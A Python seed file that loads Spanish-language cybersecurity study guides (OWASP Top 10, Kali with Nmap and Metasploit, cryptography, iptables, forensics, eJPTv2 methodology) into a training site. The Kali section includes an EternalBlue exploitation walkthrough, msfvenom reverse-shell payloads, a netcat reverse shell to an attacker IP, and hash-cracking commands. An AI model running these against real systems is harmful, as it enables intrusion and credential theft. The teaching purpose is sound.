"""
seed_teoria_startup.py
══════════════════════════════════════════════════════════════════════════════
Seeds de teoría que se ejecutan en el startup de FastAPI.
Incluye:
  - Ciberseguridad general (5 guías: OWASP, Kali, Cripto, Firewall, Forense)
  - eJPTv2 - Junior Penetration Tester (7 módulos completos)

Importado y llamado desde main.py @startup.
Todos los seeds son idempotentes (no duplican si ya existen).
══════════════════════════════════════════════════════════════════════════════
"""

import logging
import sys
import os

logger = logging.getLogger(__name__)


# ══════════════════════════════════════════════════════════════════════════════
#  CIBERSEGURIDAD — 5 GUÍAS GENERALES
# ══════════════════════════════════════════════════════════════════════════════

CIBER_POSTS = [
    {
        "title": "Guía completa: OWASP Top 10 y Seguridad Web",
        "slug": "owasp-top-10-seguridad-web",
        "order_index": 0,
        "content": """\
# Guía completa: OWASP Top 10 y Seguridad Web

## Introducción

El **OWASP Top 10** es la lista de las 10 vulnerabilidades web más críticas, publicada por la comunidad OWASP (Open Web Application Security Project). Es el estándar de referencia para developers, pentesters y profesionales de seguridad.

Como alumno de ASIR/DAW/DAM, conocer estas vulnerabilidades te permite construir aplicaciones seguras y detectar fallos en auditorías.

---

## A01: Broken Access Control

El control de acceso roto permite a usuarios no autorizados acceder a recursos ajenos.

```python
# ❌ VULNERABLE — sin validación de propiedad
@app.route('/user/<user_id>/profile')
def get_profile(user_id):
    return jsonify(User.query.get(user_id).data)

# ✅ SEGURO — valida que el recurso pertenece al usuario autenticado
@app.route('/user/<user_id>/profile')
@login_required
def get_profile(user_id):
    if int(user_id) != current_user.id:
        return jsonify({"error": "Forbidden"}), 403
    return jsonify(User.query.get(user_id).data)
```

**Prueba con Burp Suite:** Intercept → cambia el `user_id` en la request → ¿ves datos de otro usuario?

---

## A02: Cryptographic Failures

Datos sensibles transmitidos o almacenados sin cifrado adecuado.

```python
# ❌ MAL — contraseña en texto plano
user.password = request.form['password']

# ✅ BIEN — hash con bcrypt
from bcrypt import hashpw, gensalt
user.password = hashpw(request.form['password'].encode(), gensalt())
```

**Checklist:**
- TLS 1.2+ en todas las conexiones
- No usar MD5/SHA1 para contraseñas
- Cifrar datos sensibles en reposo (AES-256)

---

## A03: Injection (SQLi, XSS, LDAP...)

El más clásico. El atacante inyecta código en campos de entrada que se ejecuta en el servidor.

### SQL Injection manual

```sql
-- Input normal
username = 'admin'
-- Query: SELECT * FROM users WHERE username='admin'

-- Input malicioso
username = "' OR '1'='1' --"
-- Query: SELECT * FROM users WHERE username='' OR '1'='1' --'
-- → Devuelve TODOS los usuarios
```

```python
# ❌ VULNERABLE — concatenación directa
query = f"SELECT * FROM users WHERE username='{username}'"

# ✅ SEGURO — parámetros preparados
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

### Detección con sqlmap

```bash
sqlmap -u "http://target.com/login" --data="user=test&pass=test" --dbs
sqlmap -u "http://target.com/item?id=1" --tables -D public
```

---

## A04: Insecure Design

Falta de controles de seguridad en el diseño. No es un bug de código, es un fallo de arquitectura.

**Ejemplo:** Una app de banca que no tiene límite de intentos de login → ataques de fuerza bruta posibles.

```python
# Rate limiting con Flask-Limiter
from flask_limiter import Limiter
limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # máximo 5 intentos/minuto
def login():
    ...
```

---

## A05: Security Misconfiguration

Configuraciones por defecto inseguras, puertos abiertos innecesarios, mensajes de error verbosos.

```nginx
# ❌ Expone versión del servidor
server_tokens on;

# ✅ Oculta versión
server_tokens off;

# Cabeceras de seguridad recomendadas
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
add_header Content-Security-Policy "default-src 'self'";
```

---

## A06: Vulnerable and Outdated Components

Librerías desactualizadas con CVEs conocidos.

```bash
# Auditoría npm
npm audit
npm audit fix

# Auditoría pip
pip install safety
safety check

# Ver CVEs de un paquete concreto
pip show flask | grep Version
# Buscar en: https://nvd.nist.gov/vuln/search
```

---

## A07: Identification and Authentication Failures

Sesiones débiles, contraseñas sin complejidad, sin MFA.

```python
# Sesión segura con Flask
app.config['SESSION_COOKIE_HTTPONLY'] = True   # no accesible por JS
app.config['SESSION_COOKIE_SECURE'] = True     # solo HTTPS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # protección CSRF
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
```

---

## A08: Software and Data Integrity Failures

Actualizaciones automáticas sin verificar firma, pipelines CI/CD comprometidos.

```bash
# Verificar firma GPG de un paquete
gpg --verify archivo.tar.gz.sig archivo.tar.gz

# Verificar checksum SHA256
sha256sum archivo.tar.gz
# Comparar con el hash publicado en la web oficial
```

---

## A09: Security Logging and Monitoring Failures

Sin logs o logs insuficientes → no detectas el ataque hasta que es tarde.

```python
import logging

logging.basicConfig(
    filename='/var/log/app/security.log',
    level=logging.WARNING,
    format='%(asctime)s %(levelname)s %(message)s'
)

# Loguear intentos fallidos de login
def login():
    if not check_password(user, password):
        logging.warning(f"LOGIN FAILED - user={username} ip={request.remote_addr}")
        return jsonify({"error": "Invalid credentials"}), 401
```

---

## A10: Server-Side Request Forgery (SSRF)

El atacante fuerza al servidor a hacer requests internas.

```python
# ❌ VULNERABLE
url = request.args.get('url')
response = requests.get(url)  # puede apuntar a http://localhost/admin

# ✅ Valida URL antes de hacer el request
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.miempresa.com', 'cdn.miempresa.com']

def fetch_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    return requests.get(url)
```

---

## Recursos para practicar

| Plataforma | Descripción |
|---|---|
| [DVWA](http://dvwa.co.uk/) | Damn Vulnerable Web App, ideal para practicar |
| [WebGoat](https://owasp.org/www-project-webgoat/) | App vulnerable de OWASP con lecciones |
| [HackTheBox](https://hackthebox.com) | Máquinas CTF reales |
| [TryHackMe - OWASP Top 10](https://tryhackme.com/room/owasptop10) | Room guiada |

---

> 💡 **Tip eJPTv2:** Las vulnerabilidades web más frecuentes en el examen son SQLi, Directory Traversal y autenticación débil. Practica con DVWA antes del examen.
""",
    },
    {
        "title": "Guía completa: Kali Linux y Pentesting con Nmap y Metasploit",
        "slug": "kali-linux-pentesting-nmap-metasploit",
        "order_index": 1,
        "content": """\
# Guía completa: Kali Linux y Pentesting con Nmap y Metasploit

## ¿Qué es Kali Linux?

**Kali Linux** es una distribución Debian especializada en seguridad ofensiva, mantenida por Offensive Security (los creadores del OSCP). Incluye más de 600 herramientas preinstaladas: Nmap, Metasploit, Burp Suite, Wireshark, Aircrack-ng, John the Ripper, etc.

```bash
# Actualizar Kali
sudo apt update && sudo apt full-upgrade -y

# Instalar herramientas adicionales
sudo apt install -y gobuster ffuf feroxbuster evil-winrm bloodhound
```

---

## Nmap — El Escáner Imprescindible

### Tipos de escaneo

```bash
# Descubrimiento de hosts en red local
nmap -sn 192.168.1.0/24

# Escaneo TCP SYN (stealth, requiere root)
sudo nmap -sS 192.168.1.100

# Escaneo de todos los puertos (1-65535)
nmap -p- 192.168.1.100 --min-rate=5000

# Detección de servicios y versiones
nmap -sV 192.168.1.100

# Detección de OS
sudo nmap -O 192.168.1.100

# Script scan (NSE) — detección de vulns básica
nmap -sC 192.168.1.100

# Escaneo completo típico de pentest
sudo nmap -sS -sV -sC -O -p- --min-rate=5000 -oN resultado.txt 192.168.1.100
```

### NSE Scripts útiles

```bash
# Detección de SMB vulnerabilidades
nmap --script smb-vuln-ms17-010 192.168.1.100

# Enumeración SMB
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# FTP anonymous login
nmap --script ftp-anon 192.168.1.100

# HTTP info
nmap --script http-title,http-headers 192.168.1.100

# Todos los scripts de vuln
nmap --script vuln 192.168.1.100
```

### Interpretar resultados

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1
80/tcp   open  http       Apache httpd 2.4.38
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  microsoft-ds Samba smbd 4.X
3306/tcp open  mysql      MySQL 5.7.32
```

→ SSH 7.9, Apache 2.4.38, Samba → buscar CVEs para estas versiones.

---

## Metasploit Framework

### Arquitectura

```
msfconsole
    ├── Exploits    → código que explota una vulnerabilidad
    ├── Payloads    → lo que se ejecuta después del exploit
    │   ├── Singles    → todo en uno (pequeños)
    │   ├── Stagers    → descarga el stage
    │   └── Stages     → funcionalidad completa (Meterpreter)
    ├── Auxiliares  → escaneo, fuzzing, brute force
    ├── Encoders    → ofuscan payloads
    └── Post        → post-explotación
```

### Comandos esenciales

```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
msf > search eternalblue
msf > search type:exploit platform:windows smb

# Usar un exploit
msf > use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones requeridas
msf > show options

# Configurar opciones
msf > set RHOSTS 192.168.1.100
msf > set LHOST 192.168.1.50
msf > set LPORT 4444

# Ver payloads disponibles
msf > show payloads

# Seleccionar payload
msf > set payload windows/x64/meterpreter/reverse_tcp

# Ejecutar
msf > run    # o: exploit
```

### EternalBlue (MS17-010) paso a paso

```bash
# 1. Verificar si es vulnerable
nmap --script smb-vuln-ms17-010 192.168.1.100

# 2. En Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST <tu-IP-atacante>
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
run
```

### Msfvenom — Generar payloads

```bash
# Payload Windows ejecutable (.exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o shell.exe

# Payload Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# Listener para recibir la conexión
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
run
```

---

## Flujo típico de un pentest básico

```
1. Reconocimiento
   └── nmap -sn 192.168.1.0/24          # descubrir hosts
   └── nmap -sV -sC -p- <IP>            # escaneo completo

2. Enumeración de servicios
   └── Puerto 80/443 → Gobuster, Nikto
   └── Puerto 445     → enum4linux, smbclient
   └── Puerto 21      → ftp anonymous
   └── Puerto 3306    → mysql -u root -h <IP>

3. Búsqueda de vulnerabilidades
   └── searchsploit <servicio> <versión>
   └── search en Metasploit

4. Explotación
   └── Metasploit exploit correspondiente
   └── O exploit manual desde Exploit-DB

5. Post-explotación
   └── Meterpreter: hashdump, sysinfo, upload/download
   └── Privilege escalation
   └── Pivoting a otras máquinas
```

---

## Herramientas complementarias

```bash
# searchsploit — buscar exploits offline
searchsploit vsftpd 2.3.4
searchsploit apache 2.4.49

# Netcat — shell básica
# Atacante escucha:
nc -lvnp 4444
# Víctima conecta:
nc 192.168.1.50 4444 -e /bin/bash

# Gobuster — fuzzing web
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Nikto — scanner web básico
nikto -h http://192.168.1.100
```

---

> 💡 **Tip para el eJPTv2:** El examen usa máquinas Metasploitable o similar. Domina el flujo nmap → searchsploit/Metasploit → Meterpreter. Practica en TryHackMe room "Metasploit" y "Blue" en HackTheBox.
""",
    },
    {
        "title": "Guía completa: Criptografía Aplicada",
        "slug": "criptografia-aplicada",
        "order_index": 2,
        "content": """\
# Guía completa: Criptografía Aplicada

## Fundamentos

La **criptografía** es la ciencia de proteger información mediante transformaciones matemáticas. En ciberseguridad es fundamental para entender TLS, contraseñas, firmas digitales y ataques de cracking.

### Tipos de cifrado

| Tipo | Clave | Velocidad | Uso |
|------|-------|-----------|-----|
| **Simétrico** | Misma clave para cifrar/descifrar | Rápido | AES, cifrado de archivos |
| **Asimétrico** | Clave pública/privada | Lento | RSA, intercambio de claves, TLS |
| **Hash** | Sin clave (irreversible) | Muy rápido | Contraseñas, integridad |

---

## Cifrado Simétrico — AES

AES (Advanced Encryption Standard) es el estándar actual. Usa bloques de 128 bits con claves de 128, 192 o 256 bits.

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

# Cifrar
key = get_random_bytes(32)  # AES-256
cipher = AES.new(key, AES.MODE_GCM)
ciphertext, tag = cipher.encrypt_and_digest(b"Mensaje secreto")

print("Cifrado:", base64.b64encode(ciphertext).decode())

# Descifrar
cipher_dec = AES.new(key, AES.MODE_GCM, nonce=cipher.nonce)
plaintext = cipher_dec.decrypt_and_verify(ciphertext, tag)
print("Descifrado:", plaintext.decode())
```

**Modos de operación:**
- **ECB** — inseguro, patrones visibles (nunca usar)
- **CBC** — seguro si el IV es aleatorio
- **GCM** — autenticado, el más recomendado actualmente

---

## Cifrado Asimétrico — RSA

RSA usa par de claves: la pública cifra, la privada descifra.

```bash
# Generar par de claves RSA 2048 bits
openssl genrsa -out privada.pem 2048
openssl rsa -in privada.pem -pubout -out publica.pem

# Cifrar con clave pública
openssl rsautl -encrypt -inkey publica.pem -pubin -in mensaje.txt -out mensaje.enc

# Descifrar con clave privada
openssl rsautl -decrypt -inkey privada.pem -in mensaje.enc -out mensaje_dec.txt
```

---

## Funciones Hash

Los hashes son transformaciones de un solo sentido. El mismo input siempre produce el mismo output.

```bash
# Hash MD5 (no usar para contraseñas — roto)
echo -n "password" | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99

# Hash SHA-256 (seguro para integridad)
echo -n "password" | sha256sum
# 5e884898da28047151d0e56f8dc6292773603d0d...

# Hash bcrypt en Python (para contraseñas)
import bcrypt
password = b"MiContraseña123"
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
bcrypt.checkpw(password, hashed)  # True
```

### Ataques a hashes

```bash
# John the Ripper — cracking de hashes
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat — GPU cracking (más rápido)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt   # MD5
hashcat -m 1000 hash.txt rockyou.txt                      # NTLM (Windows)
hashcat -m 3200 hash.txt rockyou.txt                      # bcrypt

# Hash online: https://crackstation.net
```

---

## TLS/SSL — Cómo funciona HTTPS

```
Cliente                              Servidor
   |                                    |
   |─── ClientHello (versiones, ciphers) ──→|
   |←── ServerHello + Certificado ─────────|
   |    (clave pública del servidor)        |
   |─── Verifica cert con CA ──────────────|
   |─── Genera Pre-Master Secret ──────────|
   |─── Cifra con clave pública servidor ──→|
   |    Ambos derivan Master Secret         |
   |═══ Comunicación cifrada con AES ══════|
```

```bash
# Ver certificado TLS de un sitio
openssl s_client -connect google.com:443 </dev/null 2>/dev/null | \
  openssl x509 -text -noout | grep -E "Subject|Issuer|Not Before|Not After"

# Generar certificado autofirmado
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout server.key -out server.crt \
  -subj "/C=ES/O=MiEmpresa/CN=localhost"
```

---

## Esteganografía

Ocultar información dentro de archivos (imágenes, audio).

```bash
# Ocultar mensaje en imagen
steghide embed -cf imagen.jpg -sf mensaje.txt -p "contraseña"

# Extraer mensaje
steghide extract -sf imagen.jpg -p "contraseña"

# Detectar si una imagen tiene datos ocultos
steghide info imagen.jpg

# Análisis forense de imagen (strings ocultos)
strings imagen.jpg | grep -i flag
exiftool imagen.jpg   # metadatos
```

---

## PKI — Infraestructura de Clave Pública

```bash
# Crear CA propia
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt -subj "/CN=MiCA"

# Crear certificado firmado por la CA
openssl genrsa -out servidor.key 2048
openssl req -new -key servidor.key -out servidor.csr -subj "/CN=miservidor.local"
openssl x509 -req -days 365 -in servidor.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out servidor.crt

# Verificar cadena de confianza
openssl verify -CAfile ca.crt servidor.crt
```

---

> 💡 **Tip:** En CTFs y el eJPTv2, los retos de cripto suelen involucrar hashes sin sal (crackables con rockyou.txt), certificados con información interesante en el Subject, o archivos con esteganografía. Instala `steghide`, `exiftool` y `binwalk` en tu Kali.
""",
    },
    {
        "title": "Guía completa: Firewall, iptables y Seguridad de Red en Linux",
        "slug": "firewall-iptables-seguridad-red",
        "order_index": 3,
        "content": """\
# Guía completa: Firewall, iptables y Seguridad de Red en Linux

## iptables — El firewall de Linux

`iptables` filtra paquetes a nivel de kernel usando tablas de reglas (chains).

### Estructura

```
Tablas:
  ├── filter   (INPUT, FORWARD, OUTPUT) ← la más usada
  ├── nat      (PREROUTING, POSTROUTING)
  └── mangle   (manipulación de paquetes)

Chains:
  INPUT    → paquetes destinados a esta máquina
  OUTPUT   → paquetes generados por esta máquina
  FORWARD  → paquetes que pasan por esta máquina (router)
```

### Comandos básicos

```bash
# Ver reglas actuales
sudo iptables -L -n -v --line-numbers

# Política por defecto
sudo iptables -P INPUT DROP    # denegar todo por defecto
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Permitir loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Permitir conexiones establecidas
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Permitir SSH (puerto 22)
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Permitir HTTP y HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Permitir ICMP (ping)
sudo iptables -A INPUT -p icmp -j ACCEPT

# Bloquear IP específica
sudo iptables -A INPUT -s 192.168.1.100 -j DROP

# Rate limiting anti-brute force SSH
sudo iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min --limit-burst 5 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j DROP
```

### Guardar y restaurar reglas

```bash
# Guardar reglas actuales
sudo iptables-save > /etc/iptables/rules.v4

# Restaurar al inicio (Debian/Ubuntu)
sudo apt install iptables-persistent
sudo netfilter-persistent save

# Restaurar manualmente
sudo iptables-restore < /etc/iptables/rules.v4
```

---

## nftables — El sucesor de iptables

```bash
# Ver reglas
sudo nft list ruleset

# Crear tabla y chain
sudo nft add table inet filtro
sudo nft add chain inet filtro entrada { type filter hook input priority 0 \; policy drop \; }

# Permitir SSH
sudo nft add rule inet filtro entrada tcp dport 22 accept

# Permitir tráfico establecido
sudo nft add rule inet filtro entrada ct state established,related accept
```

---

## UFW — Uncomplicated Firewall (Ubuntu)

Wrapper amigable sobre iptables, ideal para servidores Ubuntu.

```bash
# Instalar y activar
sudo apt install ufw
sudo ufw enable

# Ver estado
sudo ufw status verbose

# Políticas por defecto
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Permitir servicios comunes
sudo ufw allow ssh          # puerto 22
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow from 192.168.1.0/24 to any port 3306  # MySQL solo LAN

# Bloquear IP
sudo ufw deny from 203.0.113.100

# Limitar intentos SSH (anti-brute force)
sudo ufw limit ssh

# Eliminar regla
sudo ufw delete allow 80/tcp
```

---

## Fail2ban — Protección contra Brute Force

Monitoriza logs y banea IPs que hacen demasiados intentos fallidos.

```bash
# Instalar
sudo apt install fail2ban

# Configuración personalizada
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo nano /etc/fail2ban/jail.local
```

```ini
[DEFAULT]
bantime  = 3600      # banear 1 hora
maxretry = 5         # 5 intentos fallidos
findtime = 600       # en ventana de 10 minutos

[sshd]
enabled  = true
port     = ssh
logpath  = %(sshd_log)s
maxretry = 3         # más estricto para SSH
```

```bash
# Reiniciar y ver estado
sudo systemctl restart fail2ban
sudo fail2ban-client status
sudo fail2ban-client status sshd

# Ver IPs baneadas
sudo fail2ban-client status sshd | grep "Banned IP"

# Desbanear IP manualmente
sudo fail2ban-client set sshd unbanip 192.168.1.100
```

---

## Auditoría de red con Wireshark / tcpdump

```bash
# Capturar tráfico en interfaz eth0
sudo tcpdump -i eth0 -w captura.pcap

# Filtrar por protocolo
sudo tcpdump -i eth0 port 80
sudo tcpdump -i eth0 host 192.168.1.100

# Ver paquetes HTTP en tiempo real
sudo tcpdump -i eth0 -A port 80 | grep -E "GET|POST|Host:"

# En Wireshark — filtros útiles
http.request.method == "POST"
ip.addr == 192.168.1.100
tcp.port == 4444
dns
```

---

## Escaneo de puertos desde defensa

```bash
# Ver puertos abiertos en mi propio sistema
ss -tulnp        # sockets activos
netstat -tulnp   # alternativa clásica

# Ver conexiones activas
ss -tp

# Ver qué proceso usa un puerto
sudo lsof -i :80
sudo lsof -i :22

# Cerrar un proceso que ocupa un puerto
sudo fuser -k 8080/tcp
```

---

> 💡 **Tip ASIR:** En el módulo de SAD (Seguridad y Alta Disponibilidad) del ASIR, iptables es examen habitual. Memoriza las opciones `-A` (append), `-I` (insert), `-D` (delete), `-P` (policy) y los targets `ACCEPT`, `DROP`, `REJECT`.
""",
    },
    {
        "title": "Guía completa: Análisis Forense Digital y Logs",
        "slug": "analisis-forense-digital-logs",
        "order_index": 4,
        "content": """\
# Guía completa: Análisis Forense Digital y Logs

## ¿Qué es el Análisis Forense Digital?

El **análisis forense digital** consiste en recopilar, preservar y analizar evidencias digitales tras un incidente de seguridad. El objetivo: determinar qué pasó, cómo, cuándo y quién lo hizo.

**Principio fundamental:** No contaminar la evidencia original. Siempre trabajar sobre copias forenses.

---

## Adquisición de Evidencias

### Imagen de disco con dd

```bash
# Imagen bit a bit de un disco
sudo dd if=/dev/sdb of=/mnt/backup/disco_imagen.dd bs=4M status=progress

# Con verificación de integridad
sudo dd if=/dev/sdb bs=4M | tee disco_imagen.dd | sha256sum > hash_original.txt

# Imagen solo del espacio usado (más rápida)
sudo dcfldd if=/dev/sdb of=disco_imagen.dd hash=sha256 hashlog=hash.log

# Montar imagen en modo solo lectura para análisis
sudo mount -o ro,loop disco_imagen.dd /mnt/forense
```

### Memoria RAM

```bash
# Captura de RAM con LiME (Linux Memory Extractor)
sudo insmod lime.ko "path=/mnt/usb/ram.lime format=lime"

# Análisis con Volatility
volatility -f ram.lime imageinfo
volatility -f ram.lime --profile=Linux64 linux_pslist   # procesos
volatility -f ram.lime --profile=Linux64 linux_netstat  # conexiones
```

---

## Análisis de Logs en Linux

### Ubicación de logs importantes

```bash
/var/log/auth.log        # autenticación, sudo, SSH (Debian/Ubuntu)
/var/log/secure          # equivalente en RHEL/CentOS
/var/log/syslog          # sistema general
/var/log/kern.log        # kernel
/var/log/apache2/        # Apache (access.log, error.log)
/var/log/nginx/          # Nginx
/var/log/mysql/          # MySQL
/var/log/fail2ban.log    # Fail2ban
~/.bash_history          # historial de comandos del usuario
```

### Análisis de intentos de intrusión SSH

```bash
# Ver intentos fallidos de login
sudo grep "Failed password" /var/log/auth.log | tail -20

# Contar intentos por IP (posible brute force)
sudo grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10

# Logins exitosos
sudo grep "Accepted password\|Accepted publickey" /var/log/auth.log

# Actividad de root
sudo grep "sudo" /var/log/auth.log | grep -v "pam_unix"

# Comandos ejecutados con sudo
sudo grep "COMMAND" /var/log/auth.log | tail -20
```

### Análisis de logs Apache/Nginx

```bash
# Ver IPs con más requests (posible scan/DDoS)
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# Buscar escaneos (404 masivos)
awk '$9 == 404 {print $1, $7}' /var/log/apache2/access.log | \
  sort | uniq -c | sort -rn | head -20

# Detectar intentos SQLi en logs
grep -E "(union|select|insert|update|delete|drop|'|--|;)" \
  /var/log/apache2/access.log -i | head -20

# Detectar intentos de path traversal
grep "\.\." /var/log/apache2/access.log | head -10
```

---

## Journald — systemd logs

```bash
# Ver logs del sistema (últimas 100 líneas)
journalctl -n 100

# Logs en tiempo real
journalctl -f

# Logs de un servicio específico
journalctl -u sshd -n 50
journalctl -u nginx --since "2024-01-01" --until "2024-01-02"

# Logs de arranque actual
journalctl -b

# Logs de kernel
journalctl -k

# Exportar a archivo
journalctl -u apache2 --since "1 hour ago" > logs_apache.txt
```

---

## Análisis de Procesos y Conexiones Sospechosas

```bash
# Ver todos los procesos con usuario y comando completo
ps auxf

# Procesos ordenados por CPU
top
htop

# Conexiones de red activas
ss -tupn
netstat -tupn

# Ver qué proceso tiene abierto un archivo/socket
lsof -i                    # todas las conexiones
lsof -i :4444              # puerto específico (¿reverse shell?)
lsof -p <PID>              # archivos abiertos por proceso

# Archivos modificados recientemente (últimas 24h)
find / -mtime -1 -type f 2>/dev/null | grep -v proc | grep -v sys

# Cron jobs (persistencia de malware)
crontab -l
cat /etc/crontab
ls /etc/cron.d/
ls /var/spool/cron/
```

---

## Herramientas Forenses

### Autopsy / Sleuth Kit

```bash
# Instalar Sleuth Kit
sudo apt install sleuthkit autopsy

# Listar particiones de imagen
mmls disco_imagen.dd

# Ver archivos en sistema de ficheros
fls -r -o 2048 disco_imagen.dd   # -o = offset de la partición

# Recuperar archivo borrado por inode
icat disco_imagen.dd 12345 > archivo_recuperado

# Strings en imagen (buscar artefactos)
strings disco_imagen.dd | grep -E "password|passwd|secret|flag"
```

### Volatility — Forense de Memoria

```bash
# Determinar perfil
volatility -f memoria.dump imageinfo

# Listar procesos
volatility -f memoria.dump --profile=Win7SP1x64 pslist
volatility -f memoria.dump --profile=Win7SP1x64 pstree

# Conexiones de red
volatility -f memoria.dump --profile=Win7SP1x64 netscan

# Comandos ejecutados en CMD
volatility -f memoria.dump --profile=Win7SP1x64 cmdscan
volatility -f memoria.dump --profile=Win7SP1x64 consoles

# Hashes de contraseñas
volatility -f memoria.dump --profile=Win7SP1x64 hashdump

# Procesos maliciosos inyectados
volatility -f memoria.dump --profile=Win7SP1x64 malfind
```

---

## Respuesta a Incidentes — Metodología

```
1. IDENTIFICACIÓN
   └── Detectar el incidente (alertas, anomalías en logs)
   └── Determinar alcance inicial

2. CONTENCIÓN
   └── Aislar sistemas afectados (desconectar de red)
   └── NO apagar — pierde evidencia en RAM

3. ERRADICACIÓN
   └── Eliminar malware, puertas traseras, cuentas creadas
   └── Parchear vulnerabilidades explotadas

4. RECUPERACIÓN
   └── Restaurar sistemas desde backup limpio
   └── Monitorización intensiva post-restauración

5. LECCIONES APRENDIDAS
   └── Informe post-mortem
   └── Mejoras en controles de seguridad
```

---

## Línea de tiempo (Timeline) de un incidente

```bash
# Crear timeline de actividad en disco (Sleuth Kit)
fls -r -m / disco_imagen.dd > bodyfile.txt
mactime -b bodyfile.txt -d > timeline.csv

# Analizar con LibreOffice Calc o grep
grep "2024-03-15" timeline.csv | grep -E "\.php|\.sh|\.exe"
```

---

> 💡 **Tip ASIR/Ciberseguridad:** El análisis de logs es pregunta habitual en exámenes y en entrevistas de trabajo como analista SOC. Practica con máquinas de TryHackMe como "Linux Forensics" y "Investigating Windows".
""",
    },
]


# ══════════════════════════════════════════════════════════════════════════════
#  eJPTv2 — 7 MÓDULOS COMPLETOS
# ══════════════════════════════════════════════════════════════════════════════

EJPTV2_POSTS = [
    {
        "title": "Metodología Pentesting y Preparación eJPTv2",
        "slug": "ejptv2-metodologia-pentesting",
        "order_index": 0,
        "content": """\
# Metodología Pentesting y Preparación eJPTv2

## ¿Qué es el eJPTv2?

El **eJPT (eLearnSecurity Junior Penetration Tester) v2** es una certificación de nivel de entrada en hacking ético, ofrecida por INE/eLearnSecurity. Es práctica al 100%: un examen de 48 horas en un laboratorio real donde debes comprometer máquinas y responder preguntas sobre tus hallazgos.

**Datos del examen:**
- Duración: 48 horas
- Formato: Lab + preguntas de opción múltiple
- Dificultad: Principiante/Intermedio
- Precio: ~200 USD (con voucher de INE)
- Reconocimiento: Muy valorado como primer certificado ofensivo

---

## Metodología de Pentesting — Las 5 Fases

### Fase 1: Reconocimiento (Reconnaissance)

Recopilar información sobre el objetivo sin interactuar directamente con él.

```bash
# Reconocimiento pasivo (OSINT)
whois target.com
dig target.com ANY
nslookup -type=MX target.com
theHarvester -d target.com -b google,bing,linkedin

# Búsqueda en Google (Google Dorks)
site:target.com filetype:pdf
site:target.com inurl:admin
"@target.com" filetype:xls

# Shodan (recon de IPs expuestas)
# https://shodan.io → buscar "hostname:target.com"
```

### Fase 2: Escaneo y Enumeración

Descubrir hosts activos, puertos, servicios y versiones.

```bash
# Descubrimiento de hosts
nmap -sn 192.168.1.0/24

# Escaneo completo del objetivo
sudo nmap -sS -sV -sC -p- --min-rate=5000 -oN scan.txt 192.168.1.100

# Enumeración por servicio
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
enum4linux -a 192.168.1.100        # SMB
smbclient -L //192.168.1.100 -N    # SMB shares
```

### Fase 3: Explotación (Exploitation)

Aprovechar vulnerabilidades identificadas para obtener acceso.

```bash
# Buscar exploits
searchsploit vsftpd 2.3.4
searchsploit apache 2.4.49

# Metasploit
msfconsole
use exploit/...
set RHOSTS 192.168.1.100
run
```

### Fase 4: Post-Explotación

Una vez dentro: escalar privilegios, extraer datos, moverse lateralmente.

```bash
# En Meterpreter
sysinfo
getuid
getsystem          # escalar a SYSTEM/root
hashdump           # extraer hashes de contraseñas
```

### Fase 5: Reporting

Documentar todos los hallazgos con evidencias, impacto y recomendaciones.

---

## Cómo funciona el examen eJPTv2

El examen te da acceso a una red con varias máquinas. Debes:

1. **Descubrir** qué máquinas hay en la red
2. **Enumerar** servicios en cada máquina
3. **Explotar** vulnerabilidades para obtener acceso
4. **Pivotar** hacia máquinas en subredes internas
5. **Responder** preguntas sobre tus hallazgos (IPs, versiones, flags)

